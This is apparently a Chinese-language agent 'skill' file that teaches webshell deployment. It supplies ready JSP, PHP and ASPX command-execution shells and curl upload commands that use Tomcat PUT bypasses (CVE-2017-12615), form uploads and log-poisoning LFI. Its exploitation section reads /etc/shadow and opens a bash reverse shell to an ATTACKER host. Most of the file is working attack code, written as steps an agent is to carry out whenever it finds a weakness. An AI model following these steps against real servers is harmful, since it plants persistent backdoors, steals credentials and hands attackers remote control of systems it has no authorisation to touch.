---
name: webshell-deploy
description: "Webshell 部署与利用方法论。当漏洞利用需要上传/写入 webshell 到目标服务器时使用。覆盖 JSP/PHP/ASPX webshell 生成、HTTP PUT 上传（含绕过技巧）、文件上传表单、日志注入+LFI 写入，以及 webshell 验证和利用。当发现文件上传漏洞、PUT 方法可用、LFI 可利用、或需要在目标部署持久化命令执行入口时，都应使用此 skill"
metadata:
  tags: "webshell,upload,jsp,php,aspx,put,文件上传,shell,部署,rce"
  category: "exploit"
---

# Webshell 部署与利用方法论


当漏洞利用需要上传/写入 webshell 时，按此方法论操作。

## ⛔ 深入参考

- 各平台 webshell 变体（免杀、WAF 绕过、各平台兼容版本）→ `references/webshell-payloads.md`
- Java 内存马（Filter/Servlet/Listener/Agent，无文件落地）→ [references/memory-webshell.md](references/memory-webshell.md)

## 核心原则

1. **永远不要在 curl -d 参数中内联 JSP/PHP 代码** — 转义问题会导致 payload 损坏
2. **先写本地文件，再用 `--data-binary @file` 上传** — 保证 payload 完整性
3. **一次成功比多次尝试重要** — 按正确顺序操作，避免反复试错

---

## Phase 1: 选择 Webshell 类型

根据目标技术栈选择：

| 技术栈 | 文件类型 | 上传路径示例 |
|--------|---------|-------------|
| Java/Tomcat/JBoss | `.jsp` | `/shell.jsp` |
| PHP/Apache/Nginx | `.php` | `/shell.php` |
| ASP.NET/IIS | `.aspx` | `/shell.aspx` |
| Python/Flask/Django | `.py` | 通常无法直接上传 |

## Phase 2: 生成 Webshell 文件（本地）

### ⚠️ 关键：必须写入本地文件

```bash
# ✅ 正确做法：写入本地文件
cat > /tmp/shell.jsp << 'EOF'
<%@ page import="java.util.*,java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) { out.println(line); }
    br = new BufferedReader(new InputStreamReader(p.getErrorStream()));
    while ((line = br.readLine()) != null) { out.println(line); }
}
%>
EOF

# ❌ 错误做法：在 curl -d 中内联代码（转义问题）
# curl -X PUT url/shell.jsp -d "<%@ page import=\"java.util.*\"..."
# 这会因为引号、百分号、尖括号的转义导致 payload 损坏
```

### PHP Webshell

```bash
cat > /tmp/shell.php << 'EOF'
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = $_REQUEST['cmd'];
    system($cmd);
    echo "</pre>";
}
?>
EOF
```

### ASPX Webshell

```bash
cat > /tmp/shell.aspx << 'EOF'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
if (Request["cmd"] != null) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
}
%>
EOF
```

## Phase 3: 上传 Webshell

### 方法 A: HTTP PUT 上传（Tomcat PUT CVE-2017-12615）

```bash
# 使用 --data-binary 上传本地文件（保持原始内容）
# 注意：必须使用路径绕过技巧，直接 PUT /shell.jsp 会被拒绝

# 绕过方式 1: 末尾加斜杠 (Linux)
curl -X PUT "http://TARGET:8080/shell.jsp/" --data-binary @/tmp/shell.jsp -v

# 绕过方式 2: 末尾加空格 %20
curl -X PUT "http://TARGET:8080/shell.jsp%20" --data-binary @/tmp/shell.jsp -v

# 绕过方式 3: NTFS 流 (Windows)
curl -X PUT "http://TARGET:8080/shell.jsp::$DATA" --data-binary @/tmp/shell.jsp -v
```

**判断上传成功**：响应码 `201 Created` 或 `204 No Content`。

### 方法 B: 文件上传表单

```bash
curl -X POST "http://TARGET/upload" \
    -F "file=@/tmp/shell.jsp;filename=shell.jsp" \
    -v
```

### 方法 C: 文件包含写入

```bash
# 通过日志注入写入 webshell
curl "http://TARGET/" -A '<?php system($_GET["cmd"]); ?>'
# 然后通过 LFI 包含日志文件
curl "http://TARGET/vuln.php?file=/var/log/apache2/access.log&cmd=id"
```

## Phase 4: 验证 Webshell

```bash
# 上传后立即验证
curl -s "http://TARGET:8080/shell.jsp?cmd=id"

# 期望输出: uid=0(root) 或类似用户信息
# 如果返回空/404/500，检查：
#   1. 上传路径是否正确（有无绕过后缀变化）
#   2. Webshell 代码是否完整（查看原文件大小）
#   3. 目标是否需要不同的 webshell 变体
```

## Phase 5: 利用 Webshell

```bash
# 基本命令执行
curl -s "http://TARGET:8080/shell.jsp?cmd=whoami"
curl -s "http://TARGET:8080/shell.jsp?cmd=uname+-a"
curl -s "http://TARGET:8080/shell.jsp?cmd=cat+/etc/passwd"

# URL 编码空格和特殊字符
curl -s "http://TARGET:8080/shell.jsp?cmd=ls%20-la%20/"
curl -s "http://TARGET:8080/shell.jsp?cmd=cat%20/etc/shadow"

# 反弹 shell（高级利用）
curl -s "http://TARGET:8080/shell.jsp?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/ATTACKER/4444%200>%261'"
```

## 常见错误与解决

| 问题 | 原因 | 解决 |
|------|------|------|
| PUT 返回 404 | 直接 PUT .jsp 被 Tomcat 拒绝 | 用 `/shell.jsp/` 或 `%20` 绕过 |
| Webshell 返回空白 | payload 被截断或转义损坏 | 检查文件大小，重新用 `--data-binary @file` 上传 |
| Webshell 返回 500 | JSP 编译错误 | 检查 payload 语法，尤其是引号和特殊字符 |
| 命令无输出 | 使用了 `exec()` 而非 shell `-c` | 改用 `new String[]{"/bin/sh", "-c", cmd}` |
| 文件名被重命名 | 应用端重命名了上传文件 | 从响应中提取实际文件名/路径 |

## 决策树

```
需要 webshell？
├── 目标支持 PUT？
│   ├── 是 → Phase 2 写文件 → Phase 3A PUT 上传（三种绕过按序试）
│   └── 否 → 有文件上传功能？
│       ├── 是 → Phase 3B 表单上传
│       └── 否 → 有 LFI？
│           ├── 是 → Phase 3C 日志写入 + 文件包含
│           └── 否 → 寻找其他 RCE 路径
└── 上传成功？
    ├── 是 → Phase 4 验证 → Phase 5 利用
    └── 否 → 换绕过方式 → 仍失败 → 换技术栈对应的 shell 类型
```
